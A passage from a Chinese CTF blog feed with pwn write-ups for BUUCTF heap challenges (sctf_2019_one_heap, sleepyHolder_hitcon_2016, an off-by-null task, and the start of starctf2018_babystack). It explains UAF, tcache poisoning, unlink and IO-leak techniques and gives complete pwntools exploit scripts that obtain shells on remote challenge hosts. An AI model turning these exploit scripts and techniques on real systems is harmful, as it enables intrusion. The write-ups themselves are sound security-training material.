id="EXP">EXP:</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26270</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">d_d=<span class="number">0xc91</span></span><br><span class="line">d_a=<span class="number">0xc85</span></span><br><span class="line">d_e=<span class="number">0xc9d</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Pointer Address &#x27;</span>)</span><br><span class="line">    addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Mmap: &#x27;</span>)</span><br><span class="line">leak_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;leak_addr&#x27;</span>)</span><br><span class="line">add(<span class="number">0x4f0</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x48</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x4f0</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0x580</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4f0</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#two groups of tcacheb dup</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(leak_addr)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,shellcode_store(<span class="string">&#x27;shell_64&#x27;</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,d_d,d_a,d_e)</span></span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">add(<span class="number">0x4f0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0x580</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x520</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="string">b&#x27;\x30&#x27;</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">7</span>,p64(leak_addr)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220827144407358-1671954256.png" alt=""></p><h3 id="方法二：">方法二：</h3><p>这个方法就是常规的打io leak。先是用off by null做一个堆块重叠，让两个大堆块合并的时候，中间包含一个进入tcachebin的堆块，然后申请一定字节的堆块将unsorted bin的fd指针落在tcachebin的fd指针上，然后进行爆破一比特篡改为stdout结构体地址，往stdout结构体中写入数据篡改一些字段，然后泄露libc地址。再打一次tcache dup+tcache poisoning篡改free_hook写入system地址，最终拿到shell。</p><p>就不放具体调试的图片了，直接放下exp。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29725</span>)</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">d_d=<span class="number">0xc91</span></span><br><span class="line">d_a=<span class="number">0xc85</span></span><br><span class="line">d_e=<span class="number">0xc9d</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Pointer Address &#x27;</span>)</span><br><span class="line">    addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Mmap: &#x27;</span>)</span><br><span class="line">    leak_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_addr&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x4f0</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x28</span>)<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x48</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x4f0</span>)<span class="comment">#3</span></span><br><span class="line">    add(<span class="number">0x20</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">2</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0x580</span>))</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x4f0</span>)</span><br><span class="line">    add(<span class="number">0x28</span>)</span><br><span class="line">    add(<span class="number">0x48</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#two groups of tcache dup</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x48</span>)</span><br><span class="line">    add(<span class="number">0x4f0</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0x580</span>))</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x520</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">b&#x27;\x60\x97&#x27;</span>+<span class="string">b&#x27;\n&#x27;</span>)<span class="comment">#\x60\x97  \x60\x07\xdd</span></span><br><span class="line">    add(<span class="number">0x48</span>)</span><br><span class="line">    add(<span class="number">0x48</span>)</span><br><span class="line">    edit(<span class="number">3</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3ed8b0</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    add(<span class="number">0x20</span>)</span><br><span class="line">    edit(<span class="number">5</span>,p64(free_hook)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,d_d,d_a,d_e)</span></span><br><span class="line">    add(<span class="number">0x20</span>)</span><br><span class="line">    edit(<span class="number">6</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>)</span><br><span class="line">    edit(<span class="number">7</span>,p64(sys_addr)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29725</span>)</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220827144429293-294878212.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> buu刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> off_by_null </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sctf_2019_one_heap</title>
      <link href="/posts/7136f841.html"/>
      <url>/posts/7136f841.html</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面：">写在前面：</h2><p>在之前做这道题的时候<a href="https://www.cnblogs.com/ZIKH26/articles/16632897.html">SWPUCTF_2019_p1KkHeap</a>,就受到了tcache dup+tcache poisoning来爆破申请tcache_perthread_struct结构体的启发，结果在做这道题的时候就遇见了这种手法。由于还需要打io_leak再次爆破半个字节，因此这种手法成功的概率只有1/256。</p><h2 id="保护策略：">保护策略：</h2><p><img src="../img/2706180-20220904232122044-1074256165.png" alt=""></p><h2 id="漏洞所在-程序分析：">漏洞所在&amp;&amp;程序分析：</h2><h3 id="漏洞所在：">漏洞所在：</h3><p>存在UAF漏洞如下：</p><p><img src="../img/2706180-20220904232138391-1671777028.png" alt=""></p><h3 id="程序分析：">程序分析：</h3><p>这道题只有add函数和delete函数，并且限制了两个函数的执行次数。delete函数只能执行4次，add函数只能执行15次。</p><p>然后delete函数的话只能释放最近一次执行add函数申请出来内存空间的地址。add函数最多只能申请0x7f大小的堆块，也不存在溢出。</p><h2 id="利用思路：">利用思路：</h2><h3 id="tcache-struct-attack：">tcache_struct_attack：</h3><p>存在UAF漏洞，我们打一个tcache dup。由于tcache_perthread_struct结构体是和分配出来的堆块存在固定偏移，因此tcache poisoning去修改末尾两个字节即可，改为x000(x我们需要爆破一下，概率为1/16，调试的时候关闭ASLR就不用爆破了)。</p><p>当爆破成功时，我们就可以将tcache_perthread_struct申请出来了，然后我们就可以控制任意tcache链表中的头指针，以及链表中堆块的数量。</p><p>接着我们修改0x250这条链上的count为7，我们将刚刚申请出来的tcache_perthread_struct给释放掉，该堆块的大小为0x250，由于0x250这条链上的count为7了，所以再次释放就进入了unsorted bin中。（如下图）</p><p><img src="../img/2706180-20220904232153979-37464762.png" alt=""></p><p>由于下次从这个0x250堆块中分割一定的内存，就可以让unsorted bin中的fd和bk指针落在我们想要的tcache链上。接着再次申请0x10的内存，这样就可以去编辑刚刚的fd和bk指针了，这里我们去编辑bk指针，将其修改为stdout地址(需要爆破)，然后再次释放掉这个0x10的堆块，让其进入fastbin中，等之后使用。</p><p>编辑前后，如下图</p><p><img src="../img/2706180-20220904232210264-1357791408.png" alt=""></p><p>下图是我做出来之后，懒的再关闭ASLR了，所以直接set改了一下内存值。</p><p><img src="../img/2706180-20220904232221927-1023812391.png" alt=""></p><p>然后我们申请一个0x60大小的堆块，就可以申请出来stdout结构体了，打io leak泄露libc地址。</p><p>由于之前我们释放了那个0x10的堆块，此时我们再申请回来(它一直在fastbin中),这次写入malloc_hook-8的地址(因为one_gadget都不通，只能用realloc函数来调整栈帧了)</p><p>如下图，此时的realloc_hook已经出来了，只要我们申请0x50的堆块，就可以去编辑它了。</p><p><img src="../img/2706180-20220904232259398-1658522953.png" alt=""></p><p>最终调整栈帧打one_gadget即可获取shell。</p><p>完事了关闭ASLR爆破打远程就行了。说实话这个概率是1/256，但我的脸比较黑，大多时候要爆个三百次左右才出来。</p><h2 id="EXP">EXP:</h2><p>exp里的tcache_struct_attack函数是我自定义出来的，因为每次想伪造tcache_struct里的数据，都要去数一下对应的size中的值，感觉有一点麻烦，就顺便写了个函数去指定size写下对应count的值以及地址。</p><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">d_d=<span class="number">0x98C</span></span><br><span class="line">d_a=<span class="number">0x99F</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x7f</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    delete()</span><br><span class="line">    delete()</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,d_d,d_a,0xDB5,0xD2B)</span></span><br><span class="line">    add(<span class="number">0x7f</span>,p16(<span class="number">0xc010</span>))</span><br><span class="line">    add(<span class="number">0x7f</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    payload=tcache_struct_attack(&#123;<span class="number">0x250</span>:<span class="number">7</span>,<span class="number">0x130</span>:<span class="number">1</span>&#125;)</span><br><span class="line">    add(<span class="number">0x7f</span>,payload)</span><br><span class="line">    delete()</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">&#x27;abcd&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x10</span>,p64(<span class="number">0</span>)+p16(<span class="number">0x6760</span>))</span><br><span class="line">    </span><br><span class="line">    delete()</span><br><span class="line">    add(<span class="number">0x60</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    leak_libc=recv_libc()</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3ed8b0</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> libc_base&amp;<span class="number">0xfff</span>==<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;success!!!&quot;</span>)</span><br><span class="line">        pause()</span><br><span class="line">    malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    realloc=libc_base+libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">    one_gadget=search_og(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x10</span>,p64(malloc_hook-<span class="number">8</span>))</span><br><span class="line">    add(<span class="number">0x50</span>,p64(one_gadget+libc_base)+p64(realloc+<span class="number">8</span>))</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    log(<span class="string">&#x27;Number of blasting&#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line">    p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&#x27;/home/hacker/Desktop/buu64-libc-2.27.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">    i=i+<span class="number">1</span></span><br></pre></td></tr></table></figure><p>这里是爆了355次才出来…</p><p><img src="../img/2706180-20220904232314524-847895521.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> buu刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爆破tcache_perthread_struct </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sleepyHolder_hitcon_2016</title>
      <link href="/posts/b1e92899.html"/>
      <url>/posts/b1e92899.html</url>
      
        <content type="html"><![CDATA[<h2 id="总结">总结:</h2><p>通过本题的学习，知道了<strong>malloc consolidate函数可以让fast bin的堆块进行合并，然后放到unsorted bin，同时将下一个堆块的prev inuse位置空</strong>。通过这一点给了我们利用unlink的机会,如果在2.23下我们可以利用UAF，那么即使没有溢出，也可以利用malloc consolidate让下一个堆块的prev inuse置空，最后在被合并的堆块里伪造一个fake chunk即可触发unlink。</p><h2 id="保护策略">保护策略:</h2><img src="../img/image-20221103164307719.png" alt="image-20221103164307719" style="zoom:50%;" /><h2 id="漏洞分析">漏洞分析:</h2><img src="../img/image-20221103164509633.png" alt="image-20221103164509633" style="zoom:50%;" /><p>存在UAF漏洞，但是这里free后去将一个bss段的值给置空了。而这个值被置空决定了后面的show函数和edit函数没法去利用UAF这个点。</p><h2 id="利用思路">利用思路:</h2><p>而这道题本身只能申请三种不同大小的堆块，并且每种堆块只能存在一个。</p><p>因为三种堆块里两种堆块都比较大，释放掉都能进入unsorted bin，同时没有开PIE保护并且可以篡改函数的got表，因此我们尝试往unlink的方向上考虑。</p><p>不过unlink的话我们需要控制堆块的prev inuse位和prev size位，prev size位好说，但是prev inuse位我们通常通过溢出等方式来篡改，而这道题没有溢出仅仅是存在一个被限制的UAF漏洞。</p><p>下面我们来说一下如何利用该UAF来完成unlink以及double free。</p><p>这个利用的核心就是触发malloc_consolidate函数，将fastbin中的堆块取出来进行合并放到unsorted bin中，同时将下一个堆块的prev inuse位置零。因此我们利用这一点来篡改堆块的prev inuse位，而申请末尾的堆块字节数为8的话，这样就可以控制prev size位了，从而完成unlink的前提。</p><p><strong>补充:在glibc2.23中我们申请堆块时，当遍历了fastbin后没有找到需要的堆块，并且需要的堆块大小还位于large bin的范围里(也就是不属于small bin的范围)就会去调用malloc_consolidate函数来整理下零散的堆块碎片。</strong></p><blockquote><p>布局如下:<br>add 0x28<br>add 0xFA0</p><p>delete 0   #此时堆块进入fast bin</p><p>add 0x61A80  #因为该堆块非常大，其size属于large bin的范围 于是此时触发malloc consolidate，将fastbin中的堆块放到small bin中</p><p>delete 0  #2.23中的针对double free的检测是去判断bins里的第一个地址是否为当前释放的堆块地址，而原本的0号堆块已经进入了small bin中，所以这里可以成功的double free</p><p>add 0x28 #将0号堆块申请出来，去往里面写入0x28的数据，此时我们覆盖到下一个堆块的prev size位，而prev inuse位在malloc consolidate的时候就被置为了0，从而完成了unlink前的布局</p><p>delete 1#触发unlink</p></blockquote><h2 id="调试过程">调试过程:</h2><p>上面的调试过程如下:</p><p><img src="../img/image-20221103175804788.png" alt="image-20221103175804788"></p><p><img src="../img/image-20221103180359194.png" alt="image-20221103180359194"></p><p><img src="../img/image-20221103180532202.png" alt="image-20221103180532202"></p><p><img src="../img/image-20221103180819622.png" alt="image-20221103180819622"></p><p><img src="../img/image-20221103180935673.png" alt="image-20221103180935673"></p><p>之后触发了unlink后，就是一个常规劫持got表的操作，改free函数的got为puts的plt，然后泄露libc，再改free函数的got为system地址。</p><h2 id="EXP">EXP:</h2><p><a href="https://zikh26.github.io/posts/ad411136.html">tools-函数库 | ZIKH26’s Blog</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:28037&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params"><span class="built_in">type</span>,content</span>):</span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;3. Renew secret\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;What secret do you want to keep?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line">   p.sendafter(<span class="string">&#x27;Tell me your secret:&#x27;</span>,content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">type</span></span>):</span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;3. Renew secret\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;Which Secret do you want to wipe?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">type</span>,content</span>):</span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;3. Renew secret\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;Which Secret do you want to renew?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line">   p.sendafter(<span class="string">&#x27;Tell me your secret:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">debug(p,<span class="number">0x400E3C</span>,<span class="number">0x400E48</span>,<span class="number">0x400E59</span>,<span class="number">0x400BAA</span>,<span class="number">0x400C81</span>,<span class="number">0x400CB7</span>) </span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">&#x27;ssss&#x27;</span>)   </span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">ptr=<span class="number">0x6020d0</span></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)+p64(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(e.got[<span class="string">&#x27;atoi&#x27;</span>])*<span class="number">2</span>+p64(e.got[<span class="string">&#x27;free&#x27;</span>]-<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">atoi_addr=recv_libc()</span><br><span class="line">sys_addr,bin_sh_addr=local_search(<span class="string">&#x27;atoi&#x27;</span>,atoi_addr,libc)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(sys_addr))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="../img/image-20221103181450008.png" alt="image-20221103181450008"></p>]]></content>
      
      
      <categories>
          
          <category> buu刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 篡改got表 </tag>
            
            <tag> unlink </tag>
            
            <tag> malloc_consolidate </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>starctf2018_babystack</title>
      <link href="/posts/6967ee12.html"/>
      <url>/posts/6967ee12.html</url>
      
        <content type="html"><![CDATA[<h2 id="总结">总结</h2><p>通过本题的学习与总结有：</p><ol><li><p>之前一直以为ret2libc必须得返回到原本的输入函数处，再次输入一次getshell。但有时候我们重新返回到原本的输入函数可能会出现一些问题，因此我们可以打一个栈迁移+rop执行read。就是先覆盖rbp为bss段上的地址，然后执行puts函数泄露libc，接着执行read函数往bss段上输入数据，最后执行leave ret完成栈迁移从而将执行流劫持到bss段上</p></li><li><p>插入到栈里的canary是从TLS结构体中的stack_guard成员变量赋值过来的(而函数返回时，会将栈里的canary与TLS中的stack_guard做对比)。主线程中的TLS通常位于mmap映射出来的地址空间里，而位置也比较随机，覆盖的可能性不大；子线程中的TLS则位于线程栈的顶部(高地址处)，而这个子线程栈通常也是mmap映射出来的一段内存，这就给了我们栈溢出控制子线程中的TLS机会</p></li><li><p>TLS(Thread Local Storage) 线程局部存储。本身是一种机制，简单来说就是多个线程访问同一个全局变量或者静态变量可能会发生冲突，而这个机制类似于让每个线程都备份了一份全局变量或者静态变量，当前线程只能修改自己这份全局变量或者静态变量并不会影响其他线程的全局变量以及静态变量。</p></li><li><p>在glibc实现中，TLS被指向一个segment register fs(x86-64上)，它的结构tcbhead_t定义如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">               thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="type">dtv_t</span> *dtv;</span><br><span class="line">  <span class="type">void</span> *self;       <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> multiple_threads;</span><br><span class="line">  <span class="type">int</span> gscope_flag;</span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; <span 